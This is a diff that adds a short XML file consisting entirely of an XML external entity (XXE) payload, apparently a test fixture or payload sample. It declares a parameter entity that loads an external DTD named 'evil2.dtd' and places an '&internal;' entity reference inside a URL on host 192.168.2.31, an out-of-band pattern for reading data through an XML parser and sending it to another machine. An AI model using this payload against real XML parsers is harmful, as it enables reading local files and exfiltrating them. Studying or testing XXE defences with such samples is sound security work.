@@ -1,0 +1,6 @@
+<?xml version='1.0'?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "evil2.dtd">
+%remote;  
+]> 
+<root NamespaceSchemaLocation="http://192.168.2.31/&internal;"></root>
